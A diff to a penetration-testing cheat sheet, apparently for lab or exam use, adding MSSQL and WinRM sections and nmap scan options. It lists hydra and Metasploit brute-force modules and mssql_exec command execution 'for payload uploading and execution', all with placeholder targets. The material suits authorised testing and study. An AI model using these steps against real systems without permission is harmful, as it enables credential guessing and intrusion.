@@ -4,13 +4,16 @@
   - [Summary](#summary)
   - [Before the Beginning (48h OODA)](#before-the-beginning)
 - Recon & Scanning
+  - [Tactical Deployment and Reconnaissance](#tactical-deployment-and-reconnaissance)
   - [Recon troubleshooting (OODA)](#the-ooda-loop-in-the-reconnaissance-phase-troubleshooting)
 - Service Playbooks
   - [FTP (21)](#port-21-ftp)
   - [SSH (22)](#port-22-ssh)
   - [HTTP/S (80/443)](#port-80443-https)
   - [SMB (139/445)](#port-139445-smb)
+  - [MSSQL (1433)](#port-1433-mssql)
   - [MySQL (3306)](#port-3306-mysql)
+  - [WinRM (5985)](#port-5985-winrm)
 - Payloads
   - [MSFVenom generation](#msfvenom-payloads-generation)
   - [Built-in payloads on Kali](#built-in-payloads-on-kali)
@@ -87,6 +90,7 @@ nmap -sn <target_ip_range>
 
 ```bash
 nmap -sV -sC -O -p- <target_ip> -oX v_<target_ip>.xml
+nmap -sU -sV -p 53,69,161,134 <target_ip>
 ```
 
 ### Import Nmap Results into Metasploit
@@ -305,7 +309,7 @@ TAGS: smb, smbclient, smbmap, enum4linux, psexec, hydra
 ### Scan
 
 ```bash
-nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-protocols <target_ip>
+nmap -p 139,445 --script=smb-security-mode,smb-enum-shares,smb-enum-users,smb-protocols <target_ip>
 ```
 
 ### Automatic Enumeration
@@ -324,9 +328,9 @@ enum4linux -a <target_ip>
 ### Manual Enumeration
 
 ```bash
-smbmap -H <target_ip>: (Empty session) List shares and permissions.
-smbmap -H <target_ip> -u <user> -p <pass>: List shares and permissions using credentials。
-smbmap -H <target_ip> -r <share>: Recursively list shared memory
+smbmap -H <target_ip>: (Empty session) # List shares and permissions.
+smbmap -H <target_ip> -u <user> -p <pass> # List shares and permissions using credentials。
+smbmap -H <target_ip> -r <share> # Recursively list shared memory
 ```
 
 ### Exploitation
@@ -362,6 +366,45 @@ smbmap -H <target_ip> -r <share>: Recursively list shared memory
 ```bash
 hydra -L <user_file> -P <password_file> //<target_ip> smb
 ```
+## Port 1433: MSSQL
+
+[Back to Index](#quick-index)
+
+USE: Enumerate version and attempt default or weak credentials; execute commands via xp_cmdshell/mssql_exec upon access.
+TAGS: mssql, ms-sql, hydra, metasploit, brute
+
+### Scan
+
+```bash
+nmap -p 1433 --script=ms-sql-info,ms-sql-empty-password <target_ip>
+```
+
+### Enumeration
+- Basic Enumeration
+
+  ```text
+  msf6 > use auxiliary/scanner/mssql/mssql_ping
+  ```
+- Enumeration with Valid Credential
+
+  ```text
+  msf6 > use auxiliary/admin/mssql/mssql_enum
+  msf6 > use auxiliary/admin/mssql/mssql_sql
+  ```
+
+### Brute Force
+
+```text
+msf6 > use auxiliary/scanner/mssql/mssql_login
+```
+
+### Exploitation
+
+- If get a session through `mssql_login`, run
+  ```text
+  msf6 > use auxiliary/admin/mssql/mssql_exec
+  ```
+  This module can be used to execute CMD for local enumeration and payload uploading and execution.
 
 ## Port 3306: MySQL
 
@@ -380,6 +423,31 @@ nmap -p 3306 --script mysql-info <target_ip>
 
 ```bash
 hydra -L <user_file> -P <password_file> //<target_ip> mysql
+```
+
+## Port 5985: WinRM
+
+[Back to Index](#quick-index)
+
+USE: Enumerate authentication methods; with valid credentials, obtain a shell via WinRM; fallback to brute force.
+TAGS: winrm, evil-winrm, metasploit, brute
+
+### Scan
+
+```bash
+nmap -p 5985 -sV <target_ip>
+```
+
+### Enumeration
+
+```text
+msf6 > use auxiliary/scanner/winrm/winrm_auth_methods
+```
+
+### Brute Force
+
+```text
+msf6 > use auxiliary/scanner/winrm/winrm_login
 ```
 
 ## Payload Generation and Delivery
